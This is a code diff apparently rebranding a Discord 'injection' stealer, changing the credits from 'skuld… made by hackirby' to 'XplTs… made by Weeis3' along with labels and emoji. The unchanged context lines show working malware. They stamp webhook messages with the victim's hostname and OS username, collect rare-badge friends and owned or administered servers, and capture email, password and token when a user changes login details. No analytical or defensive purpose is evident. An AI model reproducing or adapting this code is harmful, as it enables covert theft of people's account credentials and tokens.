@@ -147,7 +147,7 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
+    content["username"] = "XplTs - cord injection";
     content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
@@ -156,7 +156,7 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
+        "text": "XplTs discord injection - made by Weeis3",
         "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
@@ -279,7 +279,7 @@ const getFriends = async token => {
     for (const acc of filteredFriends) {
         var badges = getRareBadges(acc.user.public_flags)
         if (badges != "") {
-            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+            if (!rareUsers) rareUsers = "**UHQ Friends:**\n";
             rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
@@ -300,7 +300,7 @@ const getServers = async token => {
         if (rareGuilds === "") {
             rareGuilds += `**Rare Servers:**\n`;
         }
-        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:blackcrown:1237300746421010466> Owner" : "<:bluecrown:1239583787369627739> Admin"} | \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
     rareGuilds = rareGuilds || "**No Rare Servers**";
@@ -592,7 +592,7 @@ const createWindow = () => {
                 if (!requestData.password) return;
 
                 if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed email to **" + requestData.email + "**");
                 }
 
                 if (requestData.new_password) {
